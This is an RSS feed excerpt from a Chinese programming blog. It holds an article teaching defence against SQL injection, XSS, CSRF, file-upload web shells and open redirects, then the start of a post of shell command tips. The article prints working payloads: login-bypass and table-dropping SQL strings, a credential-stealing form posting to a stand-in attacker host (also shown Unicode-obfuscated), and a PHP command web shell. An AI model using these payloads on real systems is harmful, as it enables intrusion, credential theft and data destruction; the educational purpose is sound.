<p>SQL injection，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏。</p>
<p>在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：</p>
<ol>
<li>在应用程序中使用字符串联结方式组合SQL指令（如：引号没有转义）。</li>
<li>在应用程序链接数据库时使用权限过大的帐户（如：很多开发人员都喜欢用sa（最高权限的系统管理员帐户）连接Microsoft SQL Server数据库）。</li>
<li>在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）</li>
<li>过于信任用户所输入的数据，未限制输入的字符数，以及未对用户输入的数据做潜在指令的检查。</li>
</ol>
<p>例程：</p>
<p>某个网站的登录验证的SQL查询代码为</p>
<div dir="ltr">
<div>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = &quot;SELECT * FROM users
WHERE (name = &#039;&quot; + userName + &quot;&#039;) and (pw = &#039;&quot;+ passWord +&quot;&#039;);&quot;</pre>
</div>
</div>
<p>用户在登录时恶意输入如下的的用户名和口令：</p>
<div dir="ltr">
<div><code data-enlighter-language="sql" class="EnlighterJSRAW">userName = &quot;&#039; OR &#039;1&#039;=&#039;1&quot;;</code></p>
</div>
</div>
<div dir="ltr">
<div><code data-enlighter-language="sql" class="EnlighterJSRAW">passWord = &quot;&#039; OR &#039;1&#039;=&#039;1&quot;;</code></p>
</div>
</div>
<p>此时，将导致原本的SQL字符串被解析为：</p>
<div dir="ltr">
<div>
<pre data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = &quot;SELECT * FROM users
WHERE (name = &#039;&#039; OR &#039;1&#039;=&#039;1&#039;) and (pw = &#039;&#039; OR &#039;1&#039;=&#039;1&#039;);&quot;</pre>
</div>
</div>
<p>也就是实际上运行的SQL命令会变成下面这样的，因此导致无帐号密码，也可登录网站。</p>
<div dir="ltr">
<div><code data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = &quot;SELECT * FROM users;&quot;</code></p>
</div>
</div>
<p>这还不算恶劣的，真正恶劣的是在你的语句后再加一个自己的语句，如：</p>
<p><code data-enlighter-language="sql" class="EnlighterJSRAW">username= &quot;&#039; ; DELETE FROM users; --&quot;;</code></p>
<p>这样一来，要么整个数据库的表被人盗走，要么被数据库被删除。</p>
<p><strong>所以SQL注入攻击被俗称为黑客的填空游戏</strong>。你是否还记得酷壳<a title="千万别惹程序员" href="https://coolshell.cn/articles/6639.html" target="_blank">这篇文章里的SQL注入</a>？</p>
<p><img decoding="async" loading="lazy" class="aligncenter" title="SQL-injection-attack(adjusted)" src="https://coolshell.cn//wp-content/uploads/2012/02/SQL-injection-attackadjusted.jpg" alt="" width="600" height="407" /></p>
<p>当他们发现一个网站有SQL注入的时候，他们一般会干下面的事：</p>
<ul>
<li>盗取数据表中的数据，例如个人机密数据（信用卡，身份证，手机号，通讯录……），帐户数据，密码等，获得用户的数据和信息后对这些用户进行“社会工程学”活动（如：<a title="为什么不能用微信或米聊这类的软件" href="https://coolshell.cn/articles/8638.html" target="_blank">我前两天在微信上亲身经历</a>）。</li>
</ul>
<ul>
<li>取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=&#8217;xxxxxx&#8217;）。</li>
</ul>
<ul>
<li>在数据库中的数据中插入一些HTML/JS代码，有可能得以在网页加入恶意链接以及XSS，这样一来就让访问者被黑。</li>
</ul>
<ul>
<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell &#8220;net stop iisadmin&#8221;可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell &#8220;FORMAT C:&#8221;）。</li>
</ul>
<div>现在的黑客比较坏，瘫痪系统的事，他们干的越来越少，因为没什么利益，他们希望通过获取用户的帐号信息后，转而攻击用户别的帐号，如游戏帐号，网银帐号，QQ帐号等等他们可以获利的事情（这就是为什么我希望大家<a title="如何管理并设计你的口令" href="https://coolshell.cn/articles/2428.html" target="_blank">在不站点上使用不同的口令</a>，甚至不同的用户信息的原因）</div>
<p><strong>如何避免</strong></p>
<ul>
<li>在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。<strong>如果可能应该过滤以下字符：分号“;”，两个减号“&#8211;”，单引号“&#8217;”，注释“/* &#8230; */”</strong>。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）</li>
</ul>
<ul>
<li>更换危险字符。例如在PHP通过<code>addslashes()</code>函数保护SQL注入。</li>
</ul>
<ul>
<li>限制用户输入的长度，限制用户输入的取值范围。</li>
</ul>
<ul>
<li>为当前应用建立权限比较小的数据库用户，这样不会导致数据库管理员丢失。</li>
</ul>
<ul>
<li>把数据库操作封装成一个Service，对于敏感数据，对于每个客户端的IP，在一定时间内每次只返回一条记录。这样可以避免被拖库。</li>
</ul>
<h4></h4>
<h4>跨网站脚本注 入</h4>
<p><strong>跨网站脚本</strong>（<strong>Cross-site</strong> scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
<p>假如我们有这样一段PHP的代码：</p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$username = $_GET[&#039;username&#039;];
echo &#039;&lt;div&gt; Welcome, &#039; . $username . &#039;&lt;/div&gt;&#039;;</pre>
<p>那么我们可以这样来注入：</p>
<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;Script Language=&#8221;Javascript&#8221;&gt;alert(&#8220;You&#8217;ve been attacked!&#8221;);&lt;/Script&gt;</div>
<p>甚至这样：</p>
<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;div id=&#8221;stealPassword&#8221;&gt;Please Login:&lt;form name=&#8221;input&#8221; action=&#8221;http://attack.example.com/stealPassword.php&#8221; method=&#8221;post&#8221;&gt;Username: &lt;input type=&#8221;text&#8221; name=&#8221;username&#8221; /&gt;&lt;br/&gt;Password: &lt;input type=&#8221;password&#8221; name=&#8221;password&#8221; /&gt;&lt;input type=&#8221;submit&#8221; value=&#8221;Login&#8221; /&gt;&lt;/form&gt;&lt;/div&gt;</div>
<p>这会让网页显示以下内容：</p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">
&lt;div class=&quot;header&quot;&gt; Welcome,
    &lt;div id=&quot;stealPassword&quot;&gt;Please Login:
        &lt;form name=&quot;input&quot; action=&quot;attack.example.com/stealPassword.php&quot; method=&quot;post&quot;&gt;
            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;
            &lt;br/&gt;
            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;
            &lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/div&gt;
</pre>
<p>注入的代码还有可能变种为如下这种更为隐蔽的方式(unicode码)：</p>
<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">
<div>trustedSite.example.com/welcome.php?username=&lt;script+type=&#8221;text/javascript&#8221;&gt;</div>
<div>document.write(&#8216;\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073</div>
<div>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064</div>
<div>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067</div>
<div>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D</div>
<div>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063</div>
<div>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F</div>
<div>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D</div>
<div>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061</div>
<div>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068</div>
<div>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070</div>
<div>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D</div>
<div>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079</div>
<div>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061</div>
<div>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065</div>
<div>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073</div>
<div>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075</div>
<div>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073</div>
<div>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022</div>
<div>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E</div>
<div>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D</div>
<div>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C</div>
<div>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F</div>
<div>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D&#8217;);&lt;/script&gt;</div>
</div>
<p><strong>XSS的攻击主要是通过一段JS程序得用用户已登录的cookie去模拟用户的操作（甚至偷用户的cookie）</strong>。这个方式可以让用户在自己不知情的情况下操作了自己不期望的操作。如果是网站的管理员中招，还有可能导致后台管理权限被盗。关于其中的一些细节可以参看《<a title="新浪微博的XSS攻击" href="https://coolshell.cn/articles/4914.html" target="_blank">新浪微博的XSS攻击</a>》一文。XSS攻击是程序员有一糊涂就很容易犯的错误，你还可以看看网上的《<a href="http://www.cnblogs.com/kingthy/archive/2011/08/20/2147355.html" target="_blank">腾讯微博的XSS攻击</a>》。</p>
<p>XSS攻击在论坛的用户签档里面（使用img标签）也发生过很多次，包括像一些使用bcode的网站，很有可能会被注入一些可以被浏览器用来执行的代码。包括CSS都有可能被注入javascript代码。</p>
<p>不要以为XSS攻击是我们的程序没有写好，有时候，我们会引用别人站点上的js文件，比如：放一个天气预报的小Widget的js，或是一个流量监控，或是一段广告的js文件。你不知道这些东西是不是有问题，如果有恶意的话，这就是你自己主动注入攻击代码了。</p>
<p><strong>另外，XSS攻击有一部分是和浏览器有关的。</strong>比如，如下的一些例子，你可能从来都没有想过吧？（<strong>更多的例子可以参看酷壳很早以前的这篇文章《<a href="https://coolshell.cn/articles/2416.html" target="_blank">浏览器HTML安全列表</a>》</strong>）</p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;table background=”javascript:alert(1)”&gt;

&lt;meta charset=”mac-farsi”&gt;¼script¾alert(1)¼/script¾

&lt;img src=”javascript:alert(1)”&gt;</pre>
<p>XSS攻击通常会引发CSRF攻击。CSRF攻击主要是通过在A站上设置B站点上的链接，通过使用用户在B站点上的登录且还没有过期的cookie，从而使得用户的B站点被攻击。（这得益于现在的多Tab页的浏览器，大家都会同时打开并登录很多的网站，而这些不同网站的页面间的cookie又是共享的）</p>
<p>于是，如果我在A站点内的某个贴子内注入这么一段代码：</p>
<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;img src=&quot;http://bank.example.com/transfer?account=XXX&amp;amount=1000000&amp;for=haoel&quot;&gt;</code></p>
<p>很有可能你就在访问A站的这个贴子时，你的网银可能向我转了一些钱。</p>
<p><strong>如何避免</strong></p>
<p>要防止XSS攻击，一般来说有下面几种手段：</p>
<ul>
<li>严格限制用户的输入。最好不要让用户输入带标签的内容。最好不要让用户使用一些所见即所得的HTML编辑器。</li>
</ul>
<ul>
<li>严格过滤用户的输入。如：
<ul>
<li>PHP的<code>htmlentities()或是htmlspecialchars()或是strip_tags()</code>。</li>
<li>Python的<code>cgi.escape()</code></li>
<li>ASP的<code>Server.HTMLEncode()</code>。</li>
<li>Node.js的node-validator。</li>
<li>Java的<a href="http://code.google.com/p/xssprotect/" rel="nofollow">xssprotect</a>。</li>
</ul>
</li>
</ul>
<ul>
<li>在一些关键功能，完全不能信任cookie，必需要用户输入口令。如：修改口令，支付，修改电子邮件，查看用户的敏感信息等等。</li>
</ul>
<ul>
<li>限制cookie的过期时间。</li>
</ul>
<ul>
<li>对于CSRF攻击，一是需要检查http的reference header。二是不要使用GET方法来改变数据，三是对于要提交的表单，后台动态生成一个随机的token，这个token是攻击者很难伪造的。（对于token的生成，建议找一些成熟的lib库）</li>
</ul>
<p>另外，你可能觉得网站在处理用户的表单提交就行了，其实不是，<strong>想一想那些Web Mail，我可以通过别的服务器向被攻击用户发送有JS代码、图片、Flash的邮件到你的邮箱，你打开一看，你就中招了</strong>。所以，WebMail一般都禁止显示图片和附件，这些都很危险，只有你完全了解来源的情况下才能打开。<strong>电子邮件的SMTP协议太差了，基本上无法校验其它邮件服务器的可信度，我甚至可以自己建一个本机的邮件服务器，想用谁的邮件地址发信就用谁的邮件地址发信</strong>。<span style="color: #cc0000;"><strong>所以，我再次真诚地告诉大家，请用gmail邮箱</strong></span>。别再跟我说什么QQMail之类的好用了。</p>
<h4>上传文件</h4>
<p>上传文件是一个很危险的功能，尤其是你如果不校验上传文件的类型的话，你可能会中很多很多的招，这种攻击相当狠。<strong>试想，如果用户上传给你一个PHP、ASP、JSP的文件，当有人访问这个文件时，你的服务器会解释执行之，这就相当于他可以在你的服务器上执行一段程序。这无疑是相当危险的。</strong></p>
<p>举个例子：</p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;form action=&quot;upload_picture.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
要上传的文件:
&lt;input type=&quot;file&quot; name=&quot;filename&quot;/&gt;
&lt;br/&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;/&gt;
&lt;/form&gt;
</pre>
<p>&nbsp;</p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$target = &quot;pictures/&quot; . basename($_FILES[&#039;uploadedfile&#039;][&#039;name&#039;]);
if(move_uploaded_file($_FILES[&#039;uploadedfile&#039;][&#039;tmp_name&#039;], $target)){
    echo &quot;图片文件上传成功&quot;;
}else{&lt;/div&gt;
    echo &quot;图片文件上传失败&quot;;
}</pre>
<p>假如我上传了一个PHP文件如下：</p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">&lt;?php
system($_GET[&#039;cmd&#039;]);
?&gt;</pre>
<p>那么，我就可以通过如下的URL访问攻击你的网站了：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</code></p>
<p>抵御这样的攻击有两种手段：</p>
<p>1）限制上传文件的文件扩展名。</p>
<p>2）千万不要使用root或Administrator来运行你的Web应用。</p>
<h4>URL跳转</h4>
<p>URL跳转很有可能会成为攻击利用的工具。</p>
<p>比如下面的PHP代码：</p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$redirect_url = $_GET[&#039;url&#039;];
header(&quot;Location: &quot; . $redirect_url);</pre>
<p>这样的代码可能很常见，比如当用户在访问你的网站某个页观的时候没有权限，于是你的网站跳转到登录页面，当然登录完成后又跳转回刚才他访问的那个页面。一般来说，我们都会在跳转到登录页面时在URL里加上要被跳转过去的网页。于是会出现上述那样的代码。</p>
<p>于是我们就可以通过下面的URL，跳转到一个恶意网站上，而那个网站上可能有一段CSRF的代码在等着你，或是一个钓鱼网站。</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">http://bank.example.com/redirect?url=http://attacker.example.net</code></p>
<p>这种攻击具有的迷惑性在于，用户看到的http://bank.example.com，<strong>以为是一个合法网站，于是就点了这个链接，结果通过这个合法网站，把用户带到了一个恶意网站，而这个恶意网站上可能把页面做得跟这个合法网站一模一样，你还以为访问的是正确的地方，结果就被钓鱼了</strong>。</p>
<p>解决这个问题很简单，你需要在你的后台判断一下传过来的URL的域名是不是你自己的域名。</p>
<p>你可以看看Google和Baidu搜索引擎的链接跳转，百度的跳转链接是被加密过的，而Google的网站链接很长，里面有网站的明文，但是会有几个加密过的参数，如果你把那些参数移除掉，Google会显示一个重定向的提醒页面。（我个人觉得还是Google做得好）</p>
<p>（本篇文章结束）</p>
<p>这段时间工作和家里的事比较多，所以时间有限，更新不快，而此篇行文比较仓促，欢迎大家补充，并指出我文中的问题。<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/11021.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/02/Github-Security-150x150.png" alt="从“黑掉Github”学Web安全开发" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11021.html" class="wp_rp_title">从“黑掉Github”学Web安全开发</a></li><li ><a href="https://coolshell.cn/articles/6043.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="Web开发中需要了解的东西" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6043.html" class="wp_rp_title">Web开发中需要了解的东西</a></li><li ><a href="https://coolshell.cn/articles/5987.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg" alt="如何设计“找回用户帐号”功能" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5987.html" class="wp_rp_title">如何设计“找回用户帐号”功能</a></li><li ><a href="https://coolshell.cn/articles/5353.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="你会做Web上的用户登录功能吗？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5353.html" class="wp_rp_title">你会做Web上的用户登录功能吗？</a></li><li ><a href="https://coolshell.cn/articles/21708.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-150x150.png" alt="网络数字身份认证术" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21708.html" class="wp_rp_title">网络数字身份认证术</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8711.html">程序员疫苗：代码注入</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8711.html/feed</wfw:commentRss>
			<slash:comments>63</slash:comments>
		
		
			</item>
		<item>
		<title>你可能不知道的Shell</title>
		<link>https://coolshell.cn/articles/8619.html</link>
					<comments>https://coolshell.cn/articles/8619.html#comments</comments>
		
		<dc:creator><![CDATA[404null]]></dc:creator>
		<pubDate>Fri, 23 Nov 2012 00:19:24 +0000</pubDate>
				<category><![CDATA[Unix/Linux]]></category>
		<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[编程工具]]></category>
		<category><![CDATA[Bash]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8619</guid>

					<description><![CDATA[<p>Shell也叫做命令行界面，它是*nix操作系统下用户和计算机的交互界面。Shell这个词是指操作系统中提供访问内核服务的程序。 这篇文章向大家介绍Shell一...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8619.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8619.html">你可能不知道的Shell</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>Shell也叫做命令行界面，它是*nix操作系统下用户和计算机的交互界面。Shell这个词是指操作系统中提供访问内核服务的程序。</p>
<p>这篇文章向大家介绍Shell一些非广为人知、但却实用有趣的知识，权当品尝shell主食后的甜点吧。</p>
<h4>科普</h4>
<p>先科普几个你可能不知道的事实：</p>
<ul>
<li>Shell几乎是和Unix操作系统一起诞生，第一个Unix Shell是肯·汤普逊（Ken Thompson）以Multics上的Shell为模范在1971年改写而成，并命名Thompson sh。即便是后来流行的bash（shell的一种变体），它的年龄实际上比当前流行的所有的Linux kernel都大，可谓在Linux系统上是先有Shell再有Kernel。</li>
</ul>
<ul>
<li>当前绝大部分*nix和MacOS操作系统里的默认的Shell都是bash，bash由Brian Fox在1987年创造，全称Bourne Again shell ( bash)。</li>
</ul>
<ul>
<li>你或许听说除了bash之外，还有Bourne shell ( sh)，Korn shell ( ksh)，C shell （包括 csh and tcsh），但是你知道这个星球上一共存在着大约50多种不同的shell么？想了解他们，请参考 <a href="http://www.freebsd.org/ports/shells.html" target="_blank" rel="noopener">http://www.freebsd.org/ports/shells.html</a>。</li>
</ul>
<ul>
<li>每个月<a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html" target="_blank" rel="noopener">tiobe</a>上都会给一个编程语言的排名，来显示各种语言的流行度。排名指数综合了全球范围内使用该语言的工程师人数、教学的课程数和第三方供应商数。截止至2012年11月份，tiobe公布的编程语言排行榜里，bash的指数是0.56%排名22位。如果算上它旗下的awk 0.21%和tcl 0.146%，大概就能排到14名。注意这里还不包括bash的同源的兄弟姐妹csh、ksh等，算上它们，shell家族有望接近前十。值得一提的是一直以来shell的排名就很稳定，不像某些“暴发户”语言，比如objective-c，这些语言的流行完全是因为当前Apple系的崛起，但这种热潮极有可能来得快去得更快。</li>
</ul>
<p><span id="more-8619"></span></p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-18796" src="https://coolshell.cn/wp-content/uploads/2012/11/shell.01.png" alt="" width="616" height="614" srcset="https://coolshell.cn/wp-content/uploads/2012/11/shell.01.png 616w, https://coolshell.cn/wp-content/uploads/2012/11/shell.01-150x150.png 150w, https://coolshell.cn/wp-content/uploads/2012/11/shell.01-300x300.png 300w, https://coolshell.cn/wp-content/uploads/2012/11/shell.01-200x200.png 200w, https://coolshell.cn/wp-content/uploads/2012/11/shell.01-271x270.png 271w" sizes="(max-width: 616px) 100vw, 616px" /></p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-18797" src="https://coolshell.cn/wp-content/uploads/2012/11/shell.02.png" alt="" width="290" height="531" /></p>
<p>&nbsp;</p>
<p>全球最大的源代码仓库Github里，shell相关的项目数占到了8%，跻身前5和Java相当，可见在实战工程里，shell可谓宝刀不老。图片来源，<a href="https://github.com/languages">参见这里</a></p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-18798" src="https://coolshell.cn/wp-content/uploads/2012/11/shell.03.png" alt="" width="700" height="284" /></p>
<h4>一些强大的命令</h4>
<p>再分享一些可能你不知道的shell用法和脚本，简单&amp;强大！</p>
<p><em>在阅读以下部分前，强烈建议读者打开一个shell实验，这些都不是shell教科书里的大路货哦：）</em></p>
<ul>
<li><strong><code>!$</code></strong><br />
<code>!$</code>是一个特殊的环境变量，它代表了上一个命令的最后一个字符串。如：你可能会这样：</p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$mkdir mydir
$mv mydir yourdir
$cd yourdir</pre>
<p>可以改成：</p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$mkdir mydir
$mv !$ yourdir
$cd !$</pre>
</li>
</ul>
<ul>
<li><strong><code>sudo !!</code></strong><br />
以root的身份执行上一条命令 。<br />
场景举例：比如Ubuntu里用<code>apt-get</code>安装软件包的时候是需要root身份的，我们经常会忘记在<code>apt-get</code>前加<code>sudo</code>。每次不得不加上<code>sudo</code>再重新键入这行命令，这时可以很方便的用<code>sudo !!</code>完事。<br />
（陈皓注：在shell下，有时候你会输入很长的命令，你可以使用!xxx来重复最近的一次命令，比如，你以前输入过，vi /where/the/file/is, 下次你可以使用 !vi 重得上次最近一次的vi命令。）</li>
</ul>
<ul>
<li><strong><code>cd –</code></strong><br />
回到上一次的目录 。<br />
场景举例：当前目录为<code>/home/a</code>，用<code>cd ../b</code>切换到<code>/home/b</code>。这时可以通过反复执行<code>cd –</code>命令在<code>/home/a</code>和<code>/home/b</code>之间来回方便的切换。<br />
（陈皓注：cd ~ 是回到自己的Home目录，cd ~user，是进入某个用户的Home目录）</li>
</ul>
<ul>
<li><strong><code>'ALT+.' or '&lt;ESC&gt; .'</code></strong><br />
热建alt+. 或 esc+. 可以把上次命令行的参数给重复出来。</li>
</ul>
<ul>
<li><strong><code>^old^new</code></strong><br />
替换前一条命令里的部分字符串。<br />
场景：<code>echo "wanderful"</code>，其实是想输出<code>echo "wonderful"</code>。只需要<code>^a^o</code>就行了，对很长的命令的错误拼写有很大的帮助。（陈皓注：也可以使用 <strong>!!:gs/old/new</strong>）</li>
</ul>
<ul>
<li><strong><code>du -s * | sort -n | tail</code></strong><br />
列出当前目录里最大的10个文件。</li>
</ul>
<ul>
<li><strong><code>:w !sudo tee %</code></strong><br />
在vi中保存一个只有root可以写的文件</li>
</ul>
<ul>
<li><strong><code>date -d@1234567890</code></strong><br />
时间截转时间</li>
</ul>
<ul>
<li>
<div title="Click to select this command">
<div><strong><code>&gt; file.txt</code></strong><br />
创建一个空文件，比touch短。</div>
</div>
</li>
</ul>
<ul>
<li><strong><code>mtr coolshell.cn</code></strong><br />
mtr命令比traceroute要好。</li>
</ul>
<ul>
<li>在命令行前加空格，该命令不会进入history里。</li>
</ul>
<ul>
<li><strong><code>echo "ls -l" | at midnight</code></strong><br />
在某个时间运行某个命令。</li>
</ul>
<ul>
<li><strong><code>curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml</code></strong><br />
命令行的方式更新twitter。</li>
</ul>
<ul>
<li><strong><code>curl -u username --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /&lt;name&gt;/; print "$2\n" if /&lt;(title|name)&gt;(.*)&lt;\/\1&gt;/;'</code></strong><br />
检查你的gmail未读邮件</li>
</ul>
<ul>
<li><strong><code>ps aux | sort -nk +4 | tail</code></strong><br />
列出头十个最耗内存的进程</li>
</ul>
<ul>
<li><strong><code>man ascii</code></strong><br />
显示ascii码表。<br />
场景：忘记ascii码表的时候还需要google么?尤其在天朝网络如此“顺畅”的情况下，就更麻烦在GWF多应用一次规则了，直接用本地的<code>man ascii</code>吧。</li>
</ul>
<ul>
<li><strong><code>ctrl-x e</code></strong><br />
快速启动你的默认编辑器（由变量$EDITOR设置）。</li>
</ul>
<ul>
<li><strong><code>netstat –tlnp</code></strong><br />
列出本机进程监听的端口号。（陈皓注：netstat -anop 可以显示侦听在这个端口号的进程）</li>
</ul>
<ul>
<li><strong><code>tail -f /path/to/file.log | sed '/^Finished: SUCCESS$/ q'</code></strong><br />
当file.log里出现Finished: SUCCESS时候就退出tail，这个命令用于实时监控并过滤log是否出现了某条记录。</li>
</ul>
<ul>
<li><strong><code>ssh user@server bash &lt; /path/to/local/script.sh</code></strong><br />
在远程机器上运行一段脚本。这条命令最大的好处就是不用把脚本拷到远程机器上。</li>
</ul>
<ul>
<li><strong><code>ssh user@host cat /path/to/remotefile | diff /path/to/localfile -</code></strong><br />
比较一个远程文件和一个本地文件</li>
</ul>
<ul>
<li>
<div title="Click to select this command">
<div><strong><code>net rpc shutdown -I ipAddressOfWindowsPC -U username%password</code></strong><br />
远程关闭一台Windows的机器</div>
</div>
</li>
</ul>
<ul>
<li><strong><code>screen -d -m -S some_name ping my_router</code></strong><br />
后台运行一段不终止的程序，并可以随时查看它的状态。<code>-d -m</code>参数启动“分离”模式，<code>-S</code>指定了一个session的标识。可以通过<code>-R</code>命令来重新“挂载”一个标识的session。更多细节请参考screen用法 <code>man screen</code>。</li>
</ul>
<ul>
